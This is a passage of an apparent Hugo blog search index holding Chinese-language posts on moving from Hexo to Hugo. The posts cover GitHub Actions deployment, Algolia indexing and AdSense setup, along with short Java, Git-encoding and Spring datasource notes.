","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:6:3","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"更換 Github Pages 專案網址 更改專案就能改網址，可先設定別的名子把 blog 上傳上去，當設定錯誤還能救回來。 ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:6:4","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"Google Adsense 設定 網路上看到很多都是在 theme 設定的，但我認為不應該在上面設定。之前這篇Hexo NexT 主題遇到連結 %20 空白問題，新版設定 Google Adsense 方法 | 程式狂想筆記有紀錄在主blog 裡面設定。我找了很久看到某日本大大文章這樣做，大部分文章都是在 theme 修改，但在未來更新上會比較麻煩，我用 Google 翻譯免強看得懂。 參考文章 [Hugo][Zzo]Google AdSenseの広告設定に苦戦したお話 – Inomaso Blog 如何開啟或關閉Google AdSense自動廣告？ - 阿腸網頁設計 設定 我把以前設定拿來用。 \u003cdiv align=\"center\"\u003e \u003cscript async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1439458814178865\" crossorigin=\"anonymous\" \u003e\u003c/script\u003e \u003cins class=\"adsbygoogle\" style=\"display:block; text-align:center;\" data-ad-layout=\"in-article\" data-ad-format=\"fluid\" data-ad-client=\"ca-pub-xxxxxxxxxx\" data-ad-slot=\"xxxxxxxxxx\" \u003e\u003c/ins\u003e \u003cscript\u003e (adsbygoogle = window.adsbygoogle || []).push({}); \u003c/script\u003e \u003c/div\u003e 我看日本那篇對應檔案跟我主題不一樣，所以我這邊自己看LoveIt主題，發現themes\\LoveIt\\i18n\\zh-TW.toml這個檔案有大概寫那些檔案是什麼。這邊挑個幾個去 Include。 partials/header.html posts/single.html (建議) partials/footer.html partials/comment.html layouts_default\\summary.html 在你想加的地方加上 layouts\\posts\\single.html layouts_default\\summary.html ads.txt ads.txt 設定。因為我日誌設定 /blog，所以不用設定這個。 廣告類型(番外) 一直都不知道廣告類型要怎麼調整，結果查資料有找到廣告類型名稱。 但我花很多時間，可能之後做廣告優化可以再回來看這篇，再額外寫一篇筆記筆記。尤其錨定廣告看很多網站都有用，還有用手機點連結會看到的廣告，這邊都可以做很多優化。 參考: 如何開啟或關閉Google AdSense自動廣告？ - 阿腸網頁設計 ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:6:5","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"部署 Github Pages 參考文章 搜尋一些網路解決方法，最終實作出來。 Blog From Hexo To Hugo - Hugo / 如何使用 Github Actions 自動部署 Hugo | sujingjhong.com For newbies of GitHub Actions: Note that the GITHUB_TOKEN is NOT a personal access token. A GitHub Actions runner automatically creates a GITHUB_TOKEN secret to authenticate in your workflow. So, you can start to deploy immediately without any configuration. 相關文章: Hugo使用Github Action自动部署博客到Github Pages - Tomial’s Blog Hugo + GitHub Action，搭建你的博客自动发布系统 · Pseudoyu Blog From Hexo To Hugo - 實作 網路上主要很多種做法，這邊主要參考這篇Hugo + GitHub Action，搭建你的博客自动发布系统 · Pseudoyu修改。 準備: 一個 hugo-blog Github Repo(private) 一個 blog Github Repo(public) 設定 ACTION_ACCESS_TOKEN 在 secrets 設定 ACTION_ACCESS_TOKEN 設定 .github\\workflows\\deploy.yml name: deploy # 名字自取 on: push: branches: - master # 这里的意思是当 main分支发生push的时候，运行下面的jobs，这里先改为github-actions jobs: deploy: # 任务名自取 runs-on: ubuntu-18.04 # 在什么环境运行任务 steps: - uses: actions/checkout@v2 # 引用actions/checkout这个action，与所在的github仓库同名 with: submodules: true # Fetch Hugo themes (true OR recursive) 获取submodule主题 fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod - name: Setup Hugo # 步骤名自取 uses: peaceiris/actions-hugo@v2 # hugo官方提供的action，用于在任务环境中获取hugo with: hugo-version: 'latest' # 获取最新版本的hugo extended: true # 最新版沒有extended，因為 LoveIt 有用到 SCSS，新版要加上去 - name: Build run: hugo --minify # 使用hugo构建静态网页 - name: Deploy uses: peaceiris/actions-gh-pages@v3 # 一个自动发布github pages的action with: # github_token: ${{ secrets.GITHUB_TOKEN }} 该项适用于发布到源码相同repo的情况，不能用于发布到其他repo external_repository: malagege/blog # 发布到哪个repo personal_token: ${{ secrets.ACTION_ACCESS_TOKEN }} # 发布到其他repo需要提供上面生成的personal access token publish_dir: ./public # 注意这里指的是要发布哪个文件夹的内容，而不是指发布到目的仓库的什么位置，因为hugo默认生成静态网页到public文件夹，所以这里发布public文件夹里的内容 publish_branch: master # 发布到哪个branch Personal Access Token 要怎麼取得，可以看這篇Creating a personal access token - GitHub Docs。 ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:6:6","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"Google Search Console 如何讓 Google 搜尋到自己的部落格 | AnnKuoQ Blog， 備份圖，我參照這個教學做的，老實多寫這篇有點累了，一樣東西就不繼續用。orz 我看到有 Google Analytics 驗證，因為我 Blog 之前就有用，所以我使用這個方法。 LoveIt設定在 Body下面，所以我就不用這個方式，我用檔案方式驗證，這邊只要放在static裡面就可以，驗證檔案也不能刪掉。 提交 Sitemap 前往 Search Console 主控台 點擊左側欄位中的 Sitemap 輸入 sitemap.xml 點擊 提交 LoveIt 主題也幫你搞定 sitemap.xml 這個東西，你直接設定就可以了。 更新自動 ping google Search sujingjhong.com/dispatch-sitemap.yml at master · lisez/sujingjhong.com，看到這個還滿有趣的，有空再看看要不要試試。 name: Dispatch sitemap to google on: push: branches: - master jobs: upload_sitemap: runs-on: ubuntu-latest steps: - name: Wait / Sleep uses: jakejarvis/wait-action@v0.1.0 with: time: '30s' - name: curl uses: wei/curl@v1.1.1 with: args: http://www.google.com/ping?sitemap=https://sujingjhong.com/sitemap.xml ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:6:7","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"相關選單設定 參考:主题文档 - 基本概念 - LoveIt # 是否使用 robots.txt enableRobotsTXT = true # 是否使用 git 信息 enableGitInfo = true # 是否使用 emoji 代碼 enableEmoji = true # 忽略一些構建錯誤 # ignoreErrors = [\"error-remote-getjson\", \"error-missing-instagram-accesstoken\"] # 作者配置 [author] name = \"malagege\" email = \"\" link = \"\" # 菜單配置 [menu] [[menu.main]] weight = 1 identifier = \"posts\" # 你可以在名稱 (允許 HTML 格式) 之前添加其他信息, 例如圖標 pre = \"\" # 你可以在名稱 (允許 HTML 格式) 之後添加其他信息, 例如圖標 post = \"\" name = \"文章\" url = \"/posts/\" # 當你將鼠標懸停在此菜單鏈接上時, 將顯示的標題 title = \"\" [[menu.main]] weight = 2 identifier = \"tags\" pre = \"\" post = \"\" name = \"標籤\" url = \"/tags/\" title = \"\" [[menu.main]] weight = 3 identifier = \"categories\" pre = \"\" post = \"\" name = \"分類\" url = \"/categories/\" title = \"\" Algolia 自動更新 Index 前面有手動上傳 index，但這邊我看網路上很多種方法都不太一樣，這邊要注意的事我們已經有index.json，所以怎麼讓 index.json 上傳到 Algolia 是一個重要課題。 嘗試 Algolia Docsearch Uploader guzhongren/algolia-docsearch-upload-action: An especially small \u0026 quick \u0026 simple Algolia docsearch Indices upload action 星星數最高都不能用，後來有看到官網出algolia/setup-algolia-cli@v1.0.0就嘗試看看，用官網方式也比較讓人安心。卡個好幾個問題最後解決了。官網上傳不能用 json格式。這邊要用 jsonl或 ndjson 才能上傳，好險有找到轉 ndjson方法，不然我也無法度。 最後測試一個文章上去有順利解決問題。 name: deploy # 名字自取 on: push: branches: - master # 这里的意思是当 main分支发生push的时候，运行下面的jobs，这里先改为github-actions jobs: deploy: # 任务名自取 runs-on: ubuntu-18.04 # 在什么环境运行任务 steps: - uses: actions/checkout@v2 # 引用actions/checkout这个action，与所在的github仓库同名 with: submodules: true # Fetch Hugo themes (true OR recursive) 获取submodule主题 fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod - name: Setup Hugo # 步骤名自取 uses: peaceiris/actions-hugo@v2 # hugo官方提供的action，用于在任务环境中获取hugo with: hugo-version: 'latest' # 获取最新版本的hugo # extended: true - name: Build run: hugo --minify # 使用hugo构建静态网页 - name: Deploy uses: peaceiris/actions-gh-pages@v3 # 一个自动发布github pages的action with: # github_token: ${{ secrets.GITHUB_TOKEN }} 该项适用于发布到源码相同repo的情况，不能用于发布到其他repo external_repository: malagege/blog # 发布到哪个repo personal_token: ${{ secrets.ACTION_ACCESS_TOKEN }} # 发布到其他repo需要提供上面生成的personal access token publish_dir: ./public # 注意这里指的是要发布哪个文件夹的内容，而不是指发布到目的仓库的什么位置，因为hugo默认生成静态网页到public文件夹，所以这里发布public文件夹里的内容 publish_branch: master # 发布到哪个branch - uses: algolia/setup-algolia-cli@v1.0.0 with: version: 1.2.0 - name: Algolia Set Profile env: ALGOLIA_APPLICATION_ID: ${{ secrets.ALGOLIA_APPLICATION_ID }} ALGOLIA_ADMIN_API_KEY: ${{ secrets.ALGOLIA_ADMIN_API_KEY }} run: algolia profile add --name \"my-profile\" --app-id $ALGOLIA_APPLICATION_ID --admin-api-key $ALGOLIA_ADMIN_API_KEY --default - name: json2nd run: go install github.com/draxil/json2nd@latest - name: json to ndjson(jsonl) run: | ~/go/bin/json2nd ./public/index.json \u003e ./public/index.ndjson - name: Algolia Upload Index env: FILE_PATH: \"./public/index.ndjson\" INDEX_NAME: \"malagege_blog\" run: algolia objects import $INDEX_NAME -F $FILE_PATH - uses: sarisia/actions-status-discord@v1 if: always() with: webhook: ${{ secrets.DISCORD_WEBHOOK }} title: \"deploy\" description: \"Blog Build and deploy to GitHub Pages!\" username: GitHub Actions 去 Github Actions 等待奇蹟。 這邊特別說明一下，我前面失敗是主題忘記做 commit。git submodule還是需要把 module 再 commit一次才抓地到，修改完就成功了。 我看到官方 cli 工具要用 ndjson 或 jsonl 來上傳，json 不能用，不知道這個文章能不能跑? 最後我看到這篇， ndjson - How to Convert JSON to NDJSON?這幾個方法也能轉，這邊就不嘗試了。 ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:6:8","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"links 文章搬移 跟 Hexo 一樣，直接搬移就可以。 [[menu.main]] weight = 1 identifier = \"/\" # 你可以在名稱 (允許 HTML 格式) 之前添加其他信息, 例如圖標 pre = \"\" # 你可以在名稱 (允許 HTML 格式) 之後添加其他信息, 例如圖標 post = \"\" name = \"首頁\" url = \"/\" # 當你將鼠標懸停在此菜單鏈接上時, 將顯示的標題 title = \"\" [[menu.main]] weight = 5 identifier = \"links\" pre = \"\" post = \"\" name = \"好站連結\" url = \"/links/\" title = \"覺得不錯好站都會放在這邊\" 整個選單設定 [menu] [[menu.main]] weight = 1 identifier = \"/\" # 你可以在名稱 (允許 HTML 格式) 之前添加其他信息, 例如圖標 pre = \"\" # 你可以在名稱 (允許 HTML 格式) 之後添加其他信息, 例如圖標 post = \"\" name = \"首頁\" url = \"/\" # 當你將鼠標懸停在此菜單鏈接上時, 將顯示的標題 title = \"\" [[menu.main]] weight = 2 identifier = \"posts\" # 你可以在名稱 (允許 HTML 格式) 之前添加其他信息, 例如圖標 pre = \"\" # 你可以在名稱 (允許 HTML 格式) 之後添加其他信息, 例如圖標 post = \"\" name = \"文章\" url = \"/posts/\" # 當你將鼠標懸停在此菜單鏈接上時, 將顯示的標題 title = \"\" [[menu.main]] weight = 3 identifier = \"tags\" pre = \"\" post = \"\" name = \"標籤\" url = \"/tags/\" title = \"\" [[menu.main]] weight = 4 identifier = \"categories\" pre = \"\" post = \"\" name = \"分類\" url = \"/categories/\" title = \"\" [[menu.main]] weight = 5 identifier = \"links\" pre = \"\" post = \"\" name = \"好站連結\" url = \"/links/\" title = \"覺得不錯好站都會放在這邊\" ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:6:9","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"結論 雖然花了很多時間寫這篇，最近雖然沒以往更新 Blog 頻率沒這麼高，一部分最近都在 HackMD 寫筆記，一部分最近也在囤文章，由於最近換工作，工作都是接觸 ASP.NET Core，所以把之前 Java 筆記區沒寫完的文章丟出來，因為工作上不會用到，所以應該不會在更新。在把 ASP.NET Core 文章 PO 出來前，我打算把 Hexo 換到 Hugo，但一直沒時間處理，用假日時間搞了2~3個禮拜，今天終於用好了。 Hexo 我覺得還是很好的工具，用他在 Next 我很少花時間在調整 Blog 設定，但 Hugo 真的花很多，Hexo 部署到 Github Pages 一行程式可以搞定，就算少許時間我都能接受。但文章到700多篇就真的開始會卡，然後我看到有些 Blog 也開始用 Hugo，所以才決定轉向 Hugo。 Hugo 也沒想像中難，但花的時間真的還滿多，尤其部署 Github Pages 每一篇寫的都不太一樣，搜尋功能也花滿多時間參考大大寫的文章，加以調整內容執行。原本想找 Next 主題用，但我使用執行文章會有問題，到處找找推薦的主題文章，最後找到 LoveIt主題，我的文章 Mermaid 流程圖也支援，程式碼也有快速複製快捷鍵，但竟然不支援 markdown 顯示，所以我 Fork 出來使用，最後調整成功。開始執行我要轉換 Blog 計畫。 希望看的這篇的你也能順利轉換:D ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:7:0","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"其他文章 Hugo 貼身打造個人部落格 :: 第 12 屆 iThome 鐵人賽 再见Hexo，你好Hugo - Kiosk’s 个人编程技术分享 Hexo 迁移至 Hugo - 腾讯云开发者社区-腾讯云 ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:8:0","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Java"],"content":"常常寫程式可能會用到，這邊做個紀錄。 dictionary - How do I efficiently iterate over each entry in a Java Map? - Stack Overflow Map\u003cString, String\u003e map = ... for (Map.Entry\u003cString, String\u003e entry : map.entrySet()) { System.out.println(entry.getKey() + \"/\" + entry.getValue()); } On Java 10+: for (var entry : map.entrySet()) { System.out.println(entry.getKey() + \"/\" + entry.getValue()); } Java Map and forEach | 詹姆士的筆記本 - 點部落 Map\u003cString,Double\u003e map = new HashMap\u003c\u003e(); map.put(\"2330\",309D); map.put(\"2317\", 91.4); map.put(\"3008\", 4345D); //iterator Set\u003cString\u003e set = map.keySet(); Iterator\u003cString\u003e it = set.iterator(); while (it.hasNext()) { String key = it.next(); System.out.printf(\"key:%s,value:%s\\n\", key, map.get(key)); } //forEach for (Map.Entry\u003cString, Double\u003e entry : map.entrySet()) { System.out.println(\"key:\" + entry.getKey() + \",value:\" + entry.getValue()); } //lamda forEach map.forEach((u, v) -\u003e System.out.println(\"key:\" + u + \",value:\" + v)); ","date":"2022-10-09","objectID":"/blog/posts/Java-HashMap-foreach-loop/:0:0","tags":["java","foreach"],"title":"Java HashMap 使用 Foreach 迴圈","uri":"/blog/posts/Java-HashMap-foreach-loop/"},{"categories":["Java"],"content":"尚位整理。 ","date":"2022-07-31","objectID":"/blog/posts/Java-%E8%99%95%E7%90%86%E6%AA%94%E6%A1%88%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%AD%86%E8%A8%98/:0:0","tags":["java","file"],"title":"Java 處理檔案一些常用筆記","uri":"/blog/posts/Java-%E8%99%95%E7%90%86%E6%AA%94%E6%A1%88%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["Java"],"content":"路徑 https://stackoverflow.com/questions/14526260/how-do-i-get-the-file-name-from-a-string-containing-the-absolute-file-path ","date":"2022-07-31","objectID":"/blog/posts/Java-%E8%99%95%E7%90%86%E6%AA%94%E6%A1%88%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%AD%86%E8%A8%98/:1:0","tags":["java","file"],"title":"Java 處理檔案一些常用筆記","uri":"/blog/posts/Java-%E8%99%95%E7%90%86%E6%AA%94%E6%A1%88%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["Java"],"content":"檔案大小 https://kodejava.org/how-do-i-create-a-human-readable-file-size/ ","date":"2022-07-31","objectID":"/blog/posts/Java-%E8%99%95%E7%90%86%E6%AA%94%E6%A1%88%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%AD%86%E8%A8%98/:2:0","tags":["java","file"],"title":"Java 處理檔案一些常用筆記","uri":"/blog/posts/Java-%E8%99%95%E7%90%86%E6%AA%94%E6%A1%88%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["Java"],"content":"資源 https://mkyong.com/java/java-read-a-file-from-resources-folder/ https://blog.csdn.net/chengyuqiang/article/details/80114200 ","date":"2022-07-31","objectID":"/blog/posts/Java-%E8%99%95%E7%90%86%E6%AA%94%E6%A1%88%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%AD%86%E8%A8%98/:3:0","tags":["java","file"],"title":"Java 處理檔案一些常用筆記","uri":"/blog/posts/Java-%E8%99%95%E7%90%86%E6%AA%94%E6%A1%88%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["Git"],"content":"之前使用 Window 10 cmd 用 Git 指令會看中文會有亂碼，一直使用 bash都不會有這個問題，最近查了一下要怎麼處理，順便記錄一下。 ","date":"2022-07-31","objectID":"/blog/posts/Git-command-%E5%8D%B0%E5%87%BA%E4%BE%86%E4%B8%AD%E6%96%87%E6%9C%83%E9%A1%AF%E7%A4%BA%E4%BA%82%E7%A2%BC/:0:0","tags":["git","亂碼"],"title":"Git command 印出來中文會顯示亂碼","uri":"/blog/posts/Git-command-%E5%8D%B0%E5%87%BA%E4%BE%86%E4%B8%AD%E6%96%87%E6%9C%83%E9%A1%AF%E7%A4%BA%E4%BA%82%E7%A2%BC/"},{"categories":["Git"],"content":"參考來源 ","date":"2022-07-31","objectID":"/blog/posts/Git-command-%E5%8D%B0%E5%87%BA%E4%BE%86%E4%B8%AD%E6%96%87%E6%9C%83%E9%A1%AF%E7%A4%BA%E4%BA%82%E7%A2%BC/:1:0","tags":["git","亂碼"],"title":"Git command 印出來中文會顯示亂碼","uri":"/blog/posts/Git-command-%E5%8D%B0%E5%87%BA%E4%BE%86%E4%B8%AD%E6%96%87%E6%9C%83%E9%A1%AF%E7%A4%BA%E4%BA%82%E7%A2%BC/"},{"categories":["Git"],"content":"GIT - 中文亂碼的問題 | YuShu Hsiao - 點部落 git config --global core.quotepath false cmd 下 git log 還是會看到亂碼，但是bash 不會看到亂碼，可用下面指令解決 set LC_ALL=C.UTF-8 win 10 可以用下面指令永久設定 setx LC_ALL C.UTF-8 ","date":"2022-07-31","objectID":"/blog/posts/Git-command-%E5%8D%B0%E5%87%BA%E4%BE%86%E4%B8%AD%E6%96%87%E6%9C%83%E9%A1%AF%E7%A4%BA%E4%BA%82%E7%A2%BC/:1:1","tags":["git","亂碼"],"title":"Git command 印出來中文會顯示亂碼","uri":"/blog/posts/Git-command-%E5%8D%B0%E5%87%BA%E4%BE%86%E4%B8%AD%E6%96%87%E6%9C%83%E9%A1%AF%E7%A4%BA%E4%BA%82%E7%A2%BC/"},{"categories":["Git"],"content":"GIT gitk图形界面中文乱码修改_kongxingxing的专栏-CSDN博客 git config --global gui.encoding utf-8 ","date":"2022-07-31","objectID":"/blog/posts/Git-command-%E5%8D%B0%E5%87%BA%E4%BE%86%E4%B8%AD%E6%96%87%E6%9C%83%E9%A1%AF%E7%A4%BA%E4%BA%82%E7%A2%BC/:1:2","tags":["git","亂碼"],"title":"Git command 印出來中文會顯示亂碼","uri":"/blog/posts/Git-command-%E5%8D%B0%E5%87%BA%E4%BE%86%E4%B8%AD%E6%96%87%E6%9C%83%E9%A1%AF%E7%A4%BA%E4%BA%82%E7%A2%BC/"},{"categories":["Java"],"content":"寫到一半沒寫完。 一直不太了解 Java 使用 Lambdas，但每次學久久沒碰後都忘記要怎麼用，Java Lambdas 不像 JavaScript 的 Lambdas 難使用，Java 那邊還要了解 Predirect 類似這些東西 ","date":"2022-07-31","objectID":"/blog/posts/Java-Lambdas-%E7%AD%86%E8%A8%98/:0:0","tags":["java","lambdas"],"title":"Java Lambdas 筆記","uri":"/blog/posts/Java-Lambdas-%E7%AD%86%E8%A8%98/"},{"categories":["Java"],"content":"一直不太能接受 Lamdbas 為什麼能同等 Predicate 了解為什麼 Java 的 Interface 可以用 Lamdbas 使用? 因為 @FunctionalInterface關係，可以看篇部分关于Java Lambda表达式看这一篇就够了，裡面有簡單範例。 那些 Interface 可以用 Lamdbas ，看以看官方文件FunctionalInterface (Java Platform SE 8 )。還滿多可以用的。 為什麼 Lamdbas 知道你要用的裡面哪個Method? 一般我們建立 Tread 需要實立 Runabble 介面，我們都知道會跑 Runable的 run ；一般 Predicate 介面，知道是跑 test。奇怪一個 interface 怎麼知道我要跑哪個 method呢? 其實我有一個很簡單的想法，我們會發現 Runnable 和 Predicate 透過實例 Method 去呼叫，如: ArrayList.removeIf( Predicate) 有實立方法，裡面 removeIf只會呼叫test，就這麼簡單。 但是不會有呼叫多個 Methods嗎?應該是不會的，我目前看這些 Interface 實立 Method 時候都是只會呼叫一個，也許這也是程式優良的地方，單一原則。 知道以上幾點，就不會懷疑自己lamdbas 會跑哪一個 method 就不會想太多。 Lambda Expressions (The Java™ Tutorials \u003e Learning the Java Language \u003e Classes and Objects) 六角鼠年鐵人賽 Week 16 - Spring Boot - 番外篇 Java 8 Lambda Tutorial - HackMD ","date":"2022-07-31","objectID":"/blog/posts/Java-Lambdas-%E7%AD%86%E8%A8%98/:1:0","tags":["java","lambdas"],"title":"Java Lambdas 筆記","uri":"/blog/posts/Java-Lambdas-%E7%AD%86%E8%A8%98/"},{"categories":["Java"],"content":"Exception 處理 java 8 lambda表达式中的异常处理 - flydean - 博客园 備份圖 learn-java-streams/lambda-exception at master · ddean2009/learn-java-streams · GitHub ","date":"2022-07-31","objectID":"/blog/posts/Java-Lambdas-%E7%AD%86%E8%A8%98/:2:0","tags":["java","lambdas"],"title":"Java Lambdas 筆記","uri":"/blog/posts/Java-Lambdas-%E7%AD%86%E8%A8%98/"},{"categories":["Java"],"content":"有一部分寫到一半沒寫完。 ","date":"2022-07-31","objectID":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E5%A4%9A%E5%80%8B%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/:0:0","tags":["java","spring"],"title":"Spring 建立多個連線方法","uri":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E5%A4%9A%E5%80%8B%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"網路上整理資料 Spring的多事务配置（多个Transaction Manager）和使用方法 - 简书 Spring的多事务配置（多个Transaction Manager）和使用方法_Clement-Xu的专栏-CSDN博客 Spring3.0配置多個事務管理器的方法 - IT閱讀 DataSource和SessionFactory的区别_Zzrdark_的博客-CSDN博客 如何在spring框架中解决多数据源的问题 - duanxz - 博客园 如何在spring框架中解决多数据源的问题_runming56的专栏-CSDN博客 The txManager bean in this case is of the HibernateTransactionManager type. In the same way as the DataSourceTransactionManager needs a reference to the DataSource, the HibernateTransactionManager needs a reference to the SessionFactory. 16. Transaction Management 13.3 Hibernate ","date":"2022-07-31","objectID":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E5%A4%9A%E5%80%8B%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/:1:0","tags":["java","spring"],"title":"Spring 建立多個連線方法","uri":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E5%A4%9A%E5%80%8B%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"transactionManager 預設抓 transactionManager The default \u003ctx:annotation-driven\u003e target bean name transactionManager will still be used if no specifically qualified PlatformTransactionManager bean is found. 在配置檔案中，預設情況下，\u003ctx:annotation-driven\u003e會自動使用名稱為transactionManager的事務管理器。所以，如果定義的事務管理器名稱為transactionManager，那麼就可以直接使用\u003ctx:annotation-driven/\u003e ","date":"2022-07-31","objectID":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E5%A4%9A%E5%80%8B%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/:2:0","tags":["java","spring"],"title":"Spring 建立多個連線方法","uri":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E5%A4%9A%E5%80%8B%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"我公司的專案使用上面方法無效 參照Spring的多事务配置（多个Transaction Manager）和使用方法 - 简书，照上面各種設定發現我的傳案無法正常使用，後來發現Dao繼承的GenericDao裡面的SessionFactory寫死，所以上面怎麼設定都會連到，想嘗試抓現在SessionFactory，看目前沒有想到方法。 ","date":"2022-07-31","objectID":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E5%A4%9A%E5%80%8B%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/:3:0","tags":["java","spring"],"title":"Spring 建立多個連線方法","uri":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E5%A4%9A%E5%80%8B%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"Workaround 解決方法 設定 applicationContext.xml \u003cbean id=\"dataSource\" class=\"org.springframework.jndi.JndiObjectFactoryBean\"\u003e \u003cproperty name=\"jndiName\"\u003e \u003cvalue\u003ejava:/xxxPool\u003c/value\u003e \u003cvalue\u003ejava:comp/env/xxxPool\u003c/value\u003e \u003c/property\u003e \u003cproperty name=\"cache\" value=\"false\" /\u003e \u003c/bean\u003e \u003cbean id=\"dataSourceHistory\" class=\"org.springframework.jndi.JndiObjectFactoryBean\"\u003e \u003cproperty name=\"jndiName\"\u003e \u003cvalue\u003ejava:comp/env/xxxPool\u003c/value\u003e \u003c/property\u003e \u003cproperty name=\"cache\" value=\"false\" /\u003e \u003c/bean\u003e \u003cbean id=\"sessionFactory\" class=\"org.springframework.orm.hibernate4.LocalSessionFactoryBean\"\u003e \u003cproperty name=\"dataSource\" ref=\"dataSource\"/\u003e \u003cproperty name=\"packagesToScan\" value=\"com.Project.persistence.entity\" /\u003e \u003cproperty name=\"hibernateProperties\"\u003e \u003cprops\u003e \u003cprop key=\"hibernate.dialect\"\u003e org.hibernate.dialect.PostgreSQLDialect \u003c/prop\u003e \u003cprop key=\"javax.persistence.validation.mode\"\u003enone\u003c/prop\u003e \u003cprop key=\"hibernate.show_sql\"\u003etrue\u003c/prop\u003e \u003cprop key=\"hibernate.format_sql\"\u003etrue\u003c/prop\u003e \u003c!-- prop 